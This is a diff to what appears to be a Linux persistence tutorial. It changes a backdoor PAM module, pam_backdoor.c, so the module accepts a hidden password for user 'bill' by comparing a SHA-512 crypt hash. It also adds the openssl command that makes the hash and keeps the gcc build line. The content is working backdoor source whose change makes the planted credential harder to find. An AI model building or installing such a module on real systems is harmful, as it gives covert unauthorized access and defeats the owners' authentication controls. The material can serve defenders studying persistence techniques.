@@ -916,6 +916,10 @@ Assume there is an existing user account on the Linux host and you want to creat
 
 User account `bill` with backdoor password `L3t-Me-!n` is used in this example.
 
+Instead of storing the plaintext password in the PAM module, use a SHA-512 crypt hash.  The hash in this example is created like this.
+
+`openssl passwd -6 -salt w14h38cn 'L3t-Me-!n'`
+
 Create a source file called `pam_backdoor.c` as follows.  It will be compiled into `pam_backdoor.so` like this.
 
 `gcc -fPIC -shared -o pam_backdoor.so pam_backdoor.c -lpam`
@@ -926,20 +930,24 @@ Create a source file called `pam_backdoor.c` as follows.  It will be compiled in
 #include <string.h>
 #include <security/pam_appl.h>
 #include <security/pam_modules.h>
+#include <unistd.h>
 
 #define BD_USER "bill"
-#define BD_PASS "L3t-Me-!n"
+#define BD_SALT "$6$w14h38cn"
+#define BD_HASH "$6$w14h38cn$o2zRT.FR5KZJiE/M5OZ8ncGA9k8kaIqKwsHs0TLB81LRcVyyBnTdYprRgSCk/IScVnD7.U/lBgpGOIVWTRNwW1"
 
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
 {
    int r;
    void *u, *p;
+   char pwhash[200];
 
    if((r = pam_get_item(pamh, PAM_USER, (const void **)&u)) == PAM_SUCCESS)
    {
       if((r = pam_get_item(pamh, PAM_AUTHTOK, (const void **)&p)) == PAM_SUCCESS)
       {
-         if(!strcmp((char *)u, BD_USER) && !strcmp((char *)p, BD_PASS))
+         sprintf(pwhash, "%s", crypt(p, BD_SALT));
+         if(!strcmp((char *)u, BD_USER) && !strcmp(pwhash, BD_HASH))
          {
             return PAM_SUCCESS;
          }
